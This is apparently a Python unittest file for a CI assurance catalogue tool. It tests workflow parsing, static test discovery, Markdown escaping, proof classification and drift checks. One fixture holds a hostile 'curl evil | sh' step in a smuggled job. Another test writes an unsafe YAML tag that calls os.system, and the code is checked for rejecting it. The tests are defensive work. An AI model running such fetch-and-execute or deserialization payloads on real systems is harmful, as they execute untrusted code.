"""Tests for the generated Engine CI assurance catalogue and its fail-closed drift gate.

These tests pin deterministic rendering, safe workflow parsing, static (never imported) unittest discovery,
Markdown escaping, module grouping, proof classifications, malformed-input refusal, and the artifact warrant.
"""
from __future__ import annotations

import copy
import json
import os
import tempfile
import unittest
from unittest import mock

import ci_assurance as assurance
import hard_check_bite_check as hcb
import validate


class TestWorkflowExtraction(unittest.TestCase):
    def test_live_workflow_extracts_main_push_pr_and_each_executable_step(self):
        triggers, steps = assurance.workflow_facts(assurance.load_workflow())
        self.assertEqual({row["event"] for row in triggers}, {"push", "pull_request"})
        self.assertIn("main", next(row["detail"] for row in triggers if row["event"] == "push"))
        # The two-route gate (StarshipSuperjam/engine-template#1042): checkout, uv, materialize, decide,
        # full-arm validator + self-tests + emit + upload, reuse-arm validator, terminal assert-ran — ten
        # executable steps. It was twelve until the two hand-rolled completion markers were replaced by the
        # runner's own per-step outcomes (StarshipSuperjam/engine-template#1043).
        self.assertEqual(len(steps), 10)
        self.assertIn("validate.py --suite CI", " ".join(str(row["command"]) for row in steps))
        self.assertTrue(all(not row["continue"] for row in steps))
        self.assertIn("version=0.11.8", " ".join(row["details"] for row in steps))
        # A step id is rendered, not merely tolerated: the condition column prints references like
        # `steps.gate.outputs.mode`, so a catalogue that declined to print which step `gate` is would show a
        # reference whose referent it withheld.
        self.assertIn("id: gate", " ".join(row["details"] for row in steps))

    def test_a_second_job_is_refused_because_the_catalogue_would_not_describe_it(self):
        # The catalogue describes ONE job, which is what makes "the required gate cannot grow a shape the
        # published catalogue is unable to describe" a fact rather than a slogan. Without this refusal a
        # whole second job could be added and go entirely undescribed while the drift check stayed green.
        data = {"on": {"push": None}, "permissions": {"contents": "read"},
                "jobs": {"engine-ci": {"runs-on": "ubuntu-latest",
                                       "steps": [{"name": "ok", "run": "true"}]},
                         "smuggled": {"runs-on": "ubuntu-latest",
                                      "steps": [{"name": "unseen", "run": "curl evil | sh"}]}}}
        with self.assertRaisesRegex(ValueError, "smuggled"):
            assurance.workflow_facts(data)

    def test_unsafe_yaml_tag_is_rejected_without_execution(self):
        with tempfile.TemporaryDirectory() as root:
            path = os.path.join(root, assurance.WORKFLOW_REL)
            os.makedirs(os.path.dirname(path))
            with open(path, "w", encoding="utf-8") as fh:
                fh.write("!!python/object/apply:os.system ['false']\n")
            with self.assertRaises(ValueError):
                assurance.load_workflow(root)

    def test_unsupported_step_shape_fails_loud(self):
        data = {"on": {"push": None}, "permissions": {"contents": "read"},
                "jobs": {"engine-ci": {"runs-on": "ubuntu-latest", "steps": [
            {"name": "ambiguous", "run": "true", "uses": "owner/action@sha"}
        ]}}}
        with self.assertRaisesRegex(ValueError, "exactly one"):
            assurance.workflow_facts(data)


class TestStaticTestInventory(unittest.TestCase):
    def _steps(self):
        return [{"kind": "run", "command": "python -m unittest discover -s tools -p 'test_*.py' -b"}]

    def test_extracts_docstrings_without_importing_modules(self):
        with tempfile.TemporaryDirectory() as root:
            tools = os.path.join(root, ".engine", "tools")
            os.makedirs(tools)
            path = os.path.join(tools, "test_trap.py")
            with open(path, "w", encoding="utf-8") as fh:
                fh.write('"""Readable intent.\n\nSecond line."""\nraise RuntimeError("must never import")\n')
            rows = assurance.discover_test_modules(root, self._steps())
        self.assertEqual(rows, [{"path": ".engine/tools/test_trap.py",
                                 "description": "Readable intent. Second line."}])

    def test_missing_docstring_fails_loud(self):
        with tempfile.TemporaryDirectory() as root:
            tools = os.path.join(root, ".engine", "tools")
            os.makedirs(tools)
            with open(os.path.join(tools, "test_blank.py"), "w", encoding="utf-8") as fh:
                fh.write("VALUE = 1\n")
            with self.assertRaisesRegex(ValueError, "no module docstring"):
                assurance.discover_test_modules(root, self._steps())


class TestProofClassification(unittest.TestCase):
    def test_every_classification_is_explicit(self):
        kind = {"schema": {"carrier": "negative-fixture", "fixture_dir": ".engine/_fixtures/kind-schema"}}
        dedicated = {"engine/check/x": {"carrier": "negative-fixture", "fixture_dir": ".engine/_fixtures/x"},
                     "engine/check/y": {"carrier": "declared-not-applicable", "fixture_dir": ".engine/_fixtures/y"},
                     "engine/check/z": {"carrier": "missing", "fixture_dir": ".engine/_fixtures/z"}}
        self.assertIn("Shared check-kind", assurance.classify_rule(
            {"id": "engine/check/s", "tier": "hard", "kind": "schema"}, kind, dedicated)[0])
        self.assertIn("negative fixture", assurance.classify_rule(
            {"id": "engine/check/x", "tier": "hard", "kind": "custom/script"}, kind, dedicated)[0])
        self.assertIn("disclosed exception", assurance.classify_rule(
            {"id": "engine/check/y", "tier": "hard", "kind": "custom/script"}, kind, dedicated)[0])
        self.assertIn("CI will refuse", assurance.classify_rule(
            {"id": "engine/check/z", "tier": "hard", "kind": "custom/script"}, kind, dedicated)[0])
        self.assertIn("outside", assurance.classify_rule(
            {"id": "engine/check/soft", "tier": "soft", "kind": "custom/script"}, kind, dedicated)[0])

    def test_inventory_is_the_same_roster_evaluate_consumes(self):
        inventory = hcb.proof_inventory()
        hard_custom_ids = {
            rule["id"] for rule in validate.load_rules()
            if rule.get("tier") == "hard" and rule.get("kind") == "custom/script"
        }
        self.assertEqual({row["key"] for row in inventory if row["scope"] == "check"}, hard_custom_ids)

    def test_declaration_content_changes_the_shared_inventory(self):
        with tempfile.TemporaryDirectory() as root:
            check_dir = os.path.join(root, ".engine", "check")
            fixture_dir = os.path.join(root, ".engine", "_fixtures", "sample")
            os.makedirs(check_dir)
            os.makedirs(fixture_dir)
            with open(os.path.join(check_dir, "sample.json"), "w", encoding="utf-8") as fh:
                json.dump({"id": "engine/check/sample", "tier": "hard", "kind": "custom/script"}, fh)
            declaration = os.path.join(fixture_dir, "not-applicable.json")
            with open(declaration, "w", encoding="utf-8") as fh:
                json.dump({"property": hcb._NA_PROPERTY, "reason": "first reason"}, fh)
            first = hcb.proof_inventory(root=root, check_dir=check_dir,
                                        fixture_root=os.path.dirname(fixture_dir), registry={}, kinds=[])
            with open(declaration, "w", encoding="utf-8") as fh:
                json.dump({"property": hcb._NA_PROPERTY, "reason": "changed reason"}, fh)
            second = hcb.proof_inventory(root=root, check_dir=check_dir,
                                         fixture_root=os.path.dirname(fixture_dir), registry={}, kinds=[])
        self.assertNotEqual(first[0]["declaration_fingerprints"],
                            second[0]["declaration_fingerprints"])


class TestRendering(unittest.TestCase):
    def test_markdown_cells_escape_pipes_and_collapse_lines(self):
        self.assertEqual(assurance._cell("one | two\nthree"), "one \\| two three")

    def test_markdown_cells_neutralize_links_and_qualify_bare_home_issues(self):
        rendered = assurance._cell("See [proof](local.md) from #42 and engine-template #43.")
        self.assertIn(r"\[proof\]", rendered)
        self.assertIn(r"\] (local.md)", rendered)
        self.assertIn("StarshipSuperjam/engine-template#42", rendered)
        self.assertIn("StarshipSuperjam/engine-template#43", rendered)

    def test_live_render_is_byte_deterministic_grouped_and_warranted(self):
        first = assurance.canonical_catalogue()
        second = assurance.canonical_catalogue()
        self.assertEqual(first.encode(), second.encode())
        self.assertIn("#### `core`", first)
        self.assertIn("#### `validators-core`", first)
        self.assertIn("Declared test intent", first)
        self.assertIn("does **not** establish exhaustive correctness", first)
        self.assertIn("Python line or branch coverage", first)
        self.assertNotIn("coverage percentage", first.lower().replace("no coverage percentage", ""))
        self.assertNotIn("quality score", first.lower().replace("quality score", ""))

    def test_live_entries_follow_manifest_module_ownership(self):
        rendered = assurance.canonical_catalogue()
        core = rendered.split("#### `core`", 1)[1].split("\n#### `", 1)[0]
        validators = rendered.split("#### `validators-core`", 1)[1].split("\n#### `", 1)[0]
        self.assertIn(".engine/tools/test_ci_assurance.py", core)
        self.assertNotIn("engine/check/ci-assurance-drift", core)
        self.assertIn("engine/check/ci-assurance-drift", validators)
        self.assertNotIn(".engine/tools/test_ci_assurance.py", validators)

    def test_proof_totals_are_ci_scoped_and_exceptions_are_not_proofs(self):
        rows = [
            ({"tier": "hard", "kind": "custom/script"}, "a", "", None,
             {"carrier": "negative-fixture"}),
            ({"tier": "hard", "kind": "custom/script"}, "b", "", None,
             {"carrier": "declared-not-applicable"}),
            ({"tier": "hard", "kind": "schema"}, "c", "", None,
             {"carrier": "negative-fixture"}),
            ({"tier": "soft", "kind": "custom/script"}, "d", "", None, None),
        ]
        self.assertEqual(assurance._proof_totals(rows), (1, 1))

    def test_changed_proof_declaration_makes_committed_catalogue_stale(self):
        committed = assurance.canonical_catalogue()
        inventory = copy.deepcopy(hcb.proof_inventory())
        declared = next(row for row in inventory if row["declaration_fingerprints"])
        name = next(iter(declared["declaration_fingerprints"]))
        declared["declaration_fingerprints"][name] = "sha256:" + "0" * 64
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "ci-assurance.md")
            with open(path, "w", encoding="utf-8") as fh:
                fh.write(committed)
            with mock.patch.object(hcb, "proof_inventory", return_value=inventory):
                finding = assurance.check(path)
        self.assertEqual(finding["severity"], "hard")

    def test_check_reports_missing_or_stale_as_hard(self):
        with tempfile.TemporaryDirectory() as tmp:
            missing = os.path.join(tmp, "missing.md")
            with mock.patch.object(assurance, "canonical_catalogue", return_value="# canonical\n"):
                self.assertEqual(assurance.check(missing)["severity"], "hard")
                stale = os.path.join(tmp, "stale.md")
                with open(stale, "w", encoding="utf-8") as fh:
                    fh.write("# stale\n")
                self.assertEqual(assurance.check(stale)["severity"], "hard")

    def test_generation_is_byte_identical_on_repeat(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "catalogue.md")
            with mock.patch.object(assurance, "canonical_catalogue", return_value="# fixed\n"):
                assurance.generate(path)
                before = assurance._read(path)
                result = assurance.generate(path)
                after = assurance._read(path)
        self.assertEqual(before, after)
        self.assertIn("already up to date", result["message"])


if __name__ == "__main__":
    unittest.main()
